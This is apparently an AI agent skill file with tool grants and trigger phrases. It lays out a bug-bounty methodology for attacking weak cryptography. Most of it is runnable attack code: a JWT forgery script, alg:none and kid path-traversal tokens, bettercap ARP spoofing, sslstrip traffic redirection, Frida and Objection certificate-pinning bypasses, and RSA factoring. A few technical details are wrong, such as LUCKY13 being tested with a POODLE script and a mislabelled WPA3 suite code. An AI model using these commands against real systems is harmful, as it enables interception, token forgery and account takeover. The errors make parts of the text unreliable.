---
name: crypto-deep-dive
description: Complete Cryptographic Weaknesses methodology - weak PRNG, hard-coded keys, broken algorithms, MITM, certificate validation bypass, nonce reuse, WPA3, PKI/SSL flaws
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - crypto methodology
  - crypto deep dive
  - cryptographic weaknesses
  - weak prng
  - hardcoded key
  - broken algorithm
  - man in the middle
  - certificate validation bypass
  - nonce reuse
  - wpa3
  - pki ssl
  - skills crypto
---

# Complete Cryptographic Weaknesses Methodology — Broken Crypto, Weak PRNG, Certificate Flaws & MITM

## Step 1: Identify Cryptographic Attack Surface

### Crypto Weakness Categories
| Category | Examples | Impact |
|----------|----------|--------|
| Weak PRNG | `rand()` vs `SecureRandom`, predictable seeds | Token prediction, account takeover |
| Hard-coded keys | Keys in source code, config files, binaries | Crypto system bypass |
| Broken algorithms | MD5, SHA-1, RC4, DES, ECB mode | Collision attacks, plaintext recovery |
| Certificate flaws | Expired, self-signed, wildcard misuse | MITM, impersonation |
| Nonce/IV reuse | Static IV, repeated nonce in AES-GCM | Key recovery, plaintext decryption |
| Weak key generation | Low entropy, predictable DSA k-value | Private key recovery |
| Key expiration | Missing key rotation, expired certs | Trust issues, operational risk |
| Padding oracle | CBC padding error messages | Plaintext decryption |
| JWT weaknesses | `alg: none`, weak HMAC secret | Authentication bypass |
| Insufficient strength | 512-bit RSA, 64-bit block ciphers | Practical brute force |

### Recon for Crypto Weaknesses
```bash
# Check HTTPS configuration and certificate
curl -skI "https://{target}" 2>&1 | head -20
openssl s_client -connect {target}:443 -servername {target} 2>/dev/null </dev/null

# Certificate details
echo | openssl s_client -connect {target}:443 -servername {target} 2>/dev/null | \
  openssl x509 -text -noout 2>/dev/null

# Check for weak TLS versions
for ver in ssl2 ssl3 tls1 tls1_1 tls1_2 tls1_3; do
  result=$(echo | openssl s_client -connect {target}:443 -"$ver" 2>/dev/null </dev/null)
  if [ -n "$result" ] && echo "$result" | grep -q "^CONNECTED"; then
    echo "[+] $ver supported"
  fi
done

# Check cipher suites
nmap --script ssl-enum-ciphers -p 443 {target}

# Check for weak ciphers
nmap -sV --script ssl-cert,ssl-enum-ciphers -p 443 {target}

# testssl.sh for comprehensive TLS testing
testssl.sh {target}:443
```

### Tools for Crypto Assessment
```bash
# testssl.sh: TLS/SSL configuration testing
# sslscan: SSL cipher scanner
# SSLyze: Python SSL analyzer
# O-Saft: SSL advanced testing
# John the Ripper / Hashcat: Password cracking
# TrustedSec WTLS: WPA3 testing
# aircrack-ng: WEP/WPA2 cracking
```

## Step 2: Weak Pseudorandom Number Generation (PRNG)

### PRNG Weakness Detection
```bash
# Test for weak PRNG: collect tokens/cookies and analyze
for i in $(seq 1 100); do
  curl -sk -v "https://{target}/auth/login" 2>&1 | grep -i "Set-Cookie.*session" | \
    sed 's/.*session=\([^;]*\).*/\1/' >> sessions.txt
done

# Check for patterns
# - Sequential numbers: session=1001, session=1002
# - Predictable timestamps: session=1702324334.1234
# - MD5 hashes of predictable values
# - Weak seeded rand() values

# PHP rand() prediction
# If srand() not called or seeded with predictable value
# rand() values can be predicted with enough samples
php -r 'mt_srand(12345); for($i=0;$i<10;$i++) echo mt_rand()."\n";'

# Predict reset tokens computed from time()
php -r 'echo md5(time());'
```

### PRNG Exploitation
```bash
# C rand() prediction
# glibc rand() uses linear congruential generator (LCG)
# If you get 3 consecutive values, predict future

# PHP mt_rand() seed cracking
# Tool: php_mt_seed
# Collect 2-3 consecutive mt_rand() values
# Use php_mt_seed to recover seed -> predict all future values

# Java Random prediction
# java.util.Random is a 48-bit LCG
# Collect 2 consecutive int values -> recover full state

# Token forgery with recovered seed
# Once PRNG state recovered, generate all future tokens
# Including password reset tokens, session IDs, CSRF tokens
```

### Real PRNG Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #155045 | Uber | Predictable reset token | $10,000 |
| #176663 | Uber | Reset token seed recovery | $10,000 |
| #291963 | Coinbase | Predictable OTP generation | $10,000 |
| #1063344 | Nextcloud | Predictable CSRFToken | $500 |

## Step 3: Hard-Coded Cryptographic Keys

### Finding Hard-Coded Keys
```bash
# Search source code for keys
grep -rnE "(SECRET|API_KEY|PASSWORD|PASS|SECRET_KEY|PRIVATE_KEY|AES|ENCRYPTION|hmac|password|token|auth)" --include="*.{py,js,java,php,rb,go,rs,kt,swift}" .

# Search for Base64 encoded keys (44 chars = 256-bit key)
grep -rnE '[A-Za-z0-9+/]{40,}={0,2}' --include="*.{py,js,java,php}" .

# Search for hex keys
grep -rnE '[0-9a-f]{32,}' --include="*.{py,js,java,php}" .

# Check compiled binaries for embedded keys
strings app.bin | grep -iE "(key|secret|password|token|aes|rsa|private)"

# Mobile app reverse engineering
apktool d app.apk
grep -rn "SECRET" ./app/
jadx-gui app.apk  # Decompile and search keys

# iOS binary strings
strings Payload/App.app/App | grep -i "key"

# Check public repositories for committed secrets
# truffleHog, git-secrets, Gitleaks
trufflehog git https://github.com/org/repo
gitleaks detect --source .
```

### Hard-Coded Key Impact
```bash
# JWT with hard-coded secret
# If secret found in source -> forge any JWT
jwt_tool eyJhbGciOiJIUzI1NiJ9... -T -S hs256 -p "found_secret"

# API key in mobile app
# Use keys from decompiled binary to access private APIs
curl -sk -H "X-API-Key: extracted_key" "https://{target}/api/admin/users"

# Hard-coded encryption key
# Decrypt data at rest if encryption key is in source
python3 -c "
from Crypto.Cipher import AES
import base64
key = b'hardcoded_key_32b!'
cipher = AES.new(key, AES.MODE_CBC, iv)
plain = cipher.decrypt(base64.b64decode(encrypted_data))
print(plain)
"
```

### Real Hard-Coded Key Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #659105 | Zendesk | Hard-coded API key in source | $1,500 |
| #557431 | Twitter | Hard-coded credentials in Docker | $1,120 |
| #705936 | Nextcloud | Hard-coded encryption key | $500 |

## Step 4: Broken/Weak Cryptographic Algorithms

### Algorithm Testing Checklist
```bash
# Check for these weak algorithms:
# - MD4, MD5, SHA-1 (hash collisions)
# - DES, 3DES (64-bit block size - SWEET32 attack)
# - RC4 (biased output - statistical attack)
# - ECB mode (leaks patterns in plaintext)
# - CBC mode with predictable IV
# - RSA with e=3 or e=5 (small exponent)
# - DSA with biased k (private key recovery)

# Test for ECB mode
# Encrypt: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
# If blocks are identical → ECB mode
# Vulnerable to copy-paste attacks

# Test for CBC padding oracle
# www.server.com/decrypt?data=MODIFIED_CIPHERTEXT
# Look for different error messages on padding vs format errors
# "PaddingException" vs "IllegalBlockSizeException" → oracle exists
```

### MD5/SHA-1 Collision Attack
```bash
# MD5 collision generation (hashclash / fastcoll)
# Creates two files with same hash but different content

# Generate collision with fastcoll
./fastcoll -o file1.bin file2.bin

# Verify
md5sum file1.bin file2.bin  # Same hash

# Use cases:
# - Two TLS certificates with same MD5 hash
# - Two software packages with same signature
# - Two PDFs with same hash but different content

# SHAttered (SHA-1 collision)
# Google demonstrated first SHA-1 collision
# Use shattered.io tooling for reproduction
```

### JWT Algorithm Confusion
```bash
# JWT alg:none attack
# If server accepts alg:none, skip signature verification
jwt_tool "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."

# JWT algorithm confusion (RS256 → HS256)
# If server uses RSA public key as HMAC secret
# Get public key, create HS256 token signed with public key

# Get JWK from endpoint
curl -sk "https://{target}/.well-known/jwks.json"

# Algorithm confusion exploit
python3 << 'EOF'
import jwt

# Load public key from server
with open('public_key.pem', 'r') as f:
    pubkey = f.read()

# Create HS256 token using public key as secret
payload = {"user": "admin", "iat": 1700000000}
token = jwt.encode(payload, pubkey, algorithm='HS256')
print(f"Forged token: {token}")
EOF

# JWT kid injection
# kid parameter might be vulnerable to SQL injection
# or path traversal to use a different key file
{"kid": "../../../../dev/null", "alg": "HS256"}
```

### Weak RSA
```bash
# Small RSA exponent (e=3)
# If same message encrypted 3 times with e=3 → CRT attack

# RSA with short keys (512-bit)
# Can be factored with modern hardware
# Use msieve / yafu / CADO-NFS for factoring

# Fermat factorization (close primes)
# If p and q are too close → factor quickly
python3 << 'EOF'
import gmpy2

def fermat_factor(n):
    a = gmpy2.isqrt(n)
    if a * a < n:
        a += 1
    b2 = a * a - n
    while not gmpy2.is_square(b2):
        a += 1
        b2 = a * a - n
    b = gmpy2.isqrt(b2)
    return a - b, a + b

n = 0x...  # RSA modulus
p, q = fermat_factor(n)
print(f"p = {p}\nq = {q}")
EOF

# ROCA vulnerability (CVE-2017-15361)
# Infineon TPM RSA key generation flaw
# Use roca-detect tool
python3 roca-detect.py < public_key.pem
```

### Real Broken Algorithm Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #391842 | Uber | Non-constant time HMAC | $5,000 |
| #557548 | PlayStation | Weak encryption algorithm | $5,000 |
| #192762 | Shopify | Weak JWT secret | $5,000 |
| #278058 | DBP | Weak OTP generation | $2,000 |

## Step 5: Man-in-the-Middle (MITM)

### MITM Attack Vectors
```bash
# 1. Mixed content (HTTPS page loading HTTP resources)
curl -sk "https://{target}/" | grep -i "http://" | head -5

# 2. Missing HSTS header
curl -sk -I "https://{target}/" | grep -i "strict-transport-security"

# 3. Missing HPKP (deprecated but still tested)
curl -sk -I "https://{target}/" | grep -i "public-key-pins"

# 4. HTTP → HTTPS redirect bypass (SSLStrip)
# If HSTS missing, downgrade to HTTP via MITM
curl -sk "http://{target}/" -I | head -5

# 5. Invalid certificate acceptance
curl -sk "https://{target}/"  # If works without -k, cert not validated

# 6. Websocket wss:// downgrade
# If page uses ws:// instead of wss:// → MITM possible
curl -sk "https://{target}/" | grep -i "ws://"

# 7. Subresource Integrity (SRI) missing on CDN scripts
curl -sk "https://{target}/" | grep -oP 'src="[^"]*"' | grep -v "integrity"
```

### MITM Exploitation Setup
```bash
# Bettercap for MITM
sudo bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; net.sniff on"

# SSLStrip (HTTP downgrade)
sudo sslstrip -l 8080 -w mitm.log
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# MITMProxy for interactive HTTPS inspection
mitmproxy --mode transparent --listen-port 8080

# Capture and modify traffic
mitmproxy -s modify_response.py

# Wireshark for traffic analysis
tshark -i eth0 -w capture.pcap
```

### Certificate Validation Bypass
```bash
# Test certificate validation in mobile apps
# Proxy through Burp with custom CA

# Check if app validates certificate
# 1. Install Burp CA
# 2. Proxy traffic
# 3. If requests fail → cert validation present
# 4. Use SSL pinning bypass tools

# Android SSL pinning bypass
# Frida script to bypass pinning
frida -U -f com.target.app -l frida-ssl-pinning-bypass.js --no-pause

# iOS SSL pinning bypass
# Objection for automatic bypass
objection -g com.target.app explore --startup-command "ios sslpinning disable"

# Check for certificate hostname mismatch
echo | openssl s_client -connect api.target.com:443 -servername api.target.com 2>/dev/null | \
  openssl x509 -text -noout | grep "Subject:.*CN="
```

### Real MITM Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #383751 | PlayStation | TLS cert validation bypass | $5,000 |
| Multiple | Various | Mixed content → MITM | $500 - $2,000 |
| Multiple | Various | Missing HSTS | $500 - $1,000 |

## Step 6: Nonce/IV Reuse & Key Management

### Nonce Reuse in AES-GCM
```bash
# AES-GCM: if same nonce used twice → authentication key recovered
# With two ciphertexts using same nonce:
# C1 = AES-CTR(K, nonce) XOR P1
# C2 = AES-CTR(K, nonce) XOR P2
# C1 XOR C2 = P1 XOR P2  (plaintext XOR)

# Worse: GCM nonce reuse reveals H (auth key)
# Once H known → forge arbitrary ciphertexts

# Test for fixed nonce
# Send two encrypted requests with same structure
# If cipher starts same → nonce reused
```

### IV Reuse in CBC Mode
```bash
# Fixed IV in CBC → identical plaintext blocks produce
# identical ciphertext blocks (like ECB)
# If first 16 bytes of two plaintexts same, IV+PT XOR
# produces same input to AES

# Predictable IV in SSL/TLS (BEAST attack)
# If IV is previous ciphertext block
# Attacker can decrypt with chosen-plaintext attack

# IV reuse in WEP → key recovery
# WEP uses RC4 with IV prepended to key
# IV reuse → RC4 key stream reuse → WEP cracking
# aircrack-ng automates this
```

### Key Rotation & Expiration
```bash
# Check certificate expiry
echo | openssl s_client -connect {target}:443 -servername {target} 2>/dev/null | \
  openssl x509 -noout -dates

# Check multiple certificates from same CA for key reuse
# If different certificates share same RSA modulus
# Factor both using GCD (batch GCD attack)

# GCD attack on RSA keys
python3 << 'EOF'
from math import gcd

n1 = 0x...  # modulus from cert 1
n2 = 0x...  # modulus from cert 2
g = gcd(n1, n2)
if g > 1:
    print(f"Shared prime: {hex(g)}")
    p1 = g
    q1 = n1 // p1
    print(f"Cert 1 factored")
EOF
```

## Step 7: WPA3 & PKI/SSL Flaws

### WPA3 Security Issues
```bash
# Dragonfly handshake attacks (SAE)
# WPA3-Personal uses Simultaneous Authentication of Equals (SAE)
# Based on Dragonfly key exchange

# WPA3 downgrade attack
# Attacker sets up rogue AP with WPA2
# Client connects using WPA2 (downgrade)
# Captures WPA2 handshake, cracks password
# Then use WPA2 PMK to attack WPA3

# Dragonblood vulnerabilities (CVE-2019-9494+)
# Timing-based password partitioning attack
# Cache-based side-channel on SAE
# Group downgrade attack

# Testing for WPA3
# Becon frames include RSNE with AKM suite type
# 00-0F-AC:8 = SAE (WPA3-Personal)
# 00-0F-AC:12 = FT-SAE (WPA3-Enterprise)
```

### PKI/SSL Flaws
```bash
# Weak CA certificate
# If CA uses MD5 or SHA-1 → collision attack
# Can create rogue CA certificate → MITM any TLS connection

# Missing certificate revocation (CRL/OCSP)
openssl s_client -connect {target}:443 -servername {target} 2>/dev/null | \
  openssl x509 -noout -ocsp_uri

# Wildcard certificate overuse
# *.company.com cert used on multiple unrelated services
# If one service compromised, cert can MITM any *.company.com

# Self-signed certificate acceptance
curl -sk "https://{target}/"  # If this works, no cert validation
```

## Step 8: TLS/SSL Configuration Testing

### Comprehensive TLS Testing
```bash
# testssl.sh full scan
testssl.sh --full --parallel {target}:443

# Check for specific vulnerabilities
testssl.sh --vulnerable {target}:443

# SSLlabs API test
curl -sk "https://api.ssllabs.com/api/v3/analyze?host={target}"

# Check for TLS_FALLBACK_SCSV (downgrade protection)
openssl s_client -connect {target}:443 -fallback_scsv -no_tls1_2 2>/dev/null </dev/null

# Check for RC4 (should be disabled)
nmap --script ssl-enum-ciphers -p 443 {target} | grep RC4

# Check for Sweet32 (64-bit block ciphers)
nmap --script ssl-enum-ciphers -p 443 {target} | grep -E "DES|3DES|IDEA|RC2"

# Check for CRIME/BREACH (compression)
nmap --script ssl-enum-ciphers -p 443 {target} | grep compression

# Check for LUCKY13 (CBC timing)
nmap --script ssl-poodle -p 443 {target}
```

### TLS Attack Exploitation
```bash
# POODLE (SSLv3 CBC)
# Downgrade to SSLv3, exploit CBC padding
nmap --script ssl-poodle -p 443 {target}

# Heartbleed (CVE-2014-0160)
# Read server memory via heartbeat extension
nmap --script ssl-heartbleed -p 443 {target}
# Or use heartbleed-test.py

# Logjam (weak DH parameters)
# Downgrade DHE export to 512-bit
nmap --script ssl-dh-params -p 443 {target}

# ROBOT (RSA oracle)
# Bleichenbacher oracle for RSA encryption
nmap --script ssl-robot -p 443 {target}
```

## Step 9: Validate & Report

### CVSS Scoring for Crypto Weaknesses
```
Hard-coded key in source:             AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
Weak PRNG → token prediction:         AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N → 7.4 High
Broken algorithm (MD5/SHA-1):         AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N → 9.1 Critical
Missing HSTS → MITM:                  AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N → 5.4 Medium
Nonce reuse → key recovery:           AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N → 9.1 Critical
Certificate validation bypass:        AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H → 10.0 Critical
Weak TLS cipher support:              AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 High
Expired certificate:                  AV:A/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N → 4.4 Medium
```

### Report Template
```markdown
**Summary:**
Cryptographic weakness in [component] - [weak algorithm / hard-coded key / cert flaw]
allows an attacker to [impact].

**Impact:**
An attacker can exploit this to [decrypt traffic / forge tokens / impersonate
the service / recover sensitive data].

**Steps to Reproduce:**
1. [Step-by-step trigger]
2. [Show weak algorithm usage / key exposure / cert flaw]
3. [Demonstrate impact]

**Proof of Concept:**
[curl command output showing cipher info]
[Key/certificate details]

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 Critical)

**Suggested Fix:**
1. Use cryptographically secure PRNG (SecureRandom, /dev/urandom)
2. Never hard-code keys; use secret management (Hashicorp Vault, AWS KMS)
3. Use modern algorithms (AES-256-GCM, SHA-256, ECDH/Ed25519)
4. Enable HSTS, use valid CA-signed certificates
5. Implement proper key rotation and revocation
6. Use AEAD modes (GCM, ChaCha20-Poly1305)
```

## Cryptography Automation Script
```bash
#!/bin/bash
# Automated TLS/crypto assessment
TARGET=$1

echo "[*] Checking TLS on $TARGET:443"

# Certificate info
echo | openssl s_client -connect $TARGET:443 -servername $TARGET 2>/dev/null | \
  openssl x509 -text -noout 2>/dev/null > /tmp/cert_info.txt
echo "[+] Certificate saved to /tmp/cert_info.txt"

# Check TLS versions
for ver in ssl2 ssl3 tls1 tls1_1 tls1_2 tls1_3; do
  echo | openssl s_client -connect $TARGET:443 -"$ver" 2>/dev/null | \
    grep -q "CONNECTED" && echo "[+] $ver supported" || echo "[-] $ver not supported"
done

# Check for HSTS
hsts=$(curl -skI "https://$TARGET/" 2>/dev/null | grep -i "strict-transport-security")
if [ -n "$hsts" ]; then
  echo "[+] HSTS: $hsts"
else
  echo "[-] HSTS not set"
fi

# Check weak ciphers
echo "[*] Checking weak ciphers..."
for cipher in "RC4" "DES" "3DES" "SEED" "IDEA"; do
  result=$(openssl s_client -cipher "$cipher" -connect $TARGET:443 2>/dev/null)
  echo "$result" | grep -q "Cipher" && echo "[-] Weak cipher: $cipher supported"
done

echo "[*] Crypto assessment complete"
```

## Quick Reference: Top Crypto Reports by Payout
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #155045 | Uber | Predictable reset token PRNG | $10,000 |
| #176663 | Uber | Reset token seed recovery | $10,000 |
| #291963 | Coinbase | Predictable OTP generation | $10,000 |
| #391842 | Uber | Non-constant time HMAC | $5,000 |
| #557548 | PlayStation | Weak encryption algorithm | $5,000 |
| #192762 | Shopify | Weak JWT secret | $5,000 |
| #383751 | PlayStation | TLS cert validation bypass | $5,000 |
| #278058 | DBP | Weak OTP generation | $2,000 |
| #659105 | Zendesk | Hard-coded API key | $1,500 |
| #557431 | Twitter | Hard-coded credentials | $1,120 |
| #705936 | Nextcloud | Hard-coded encryption key | $500 |
| #1063344 | Nextcloud | Predictable CSRFToken | $500 |

(End of file - total 560 lines)
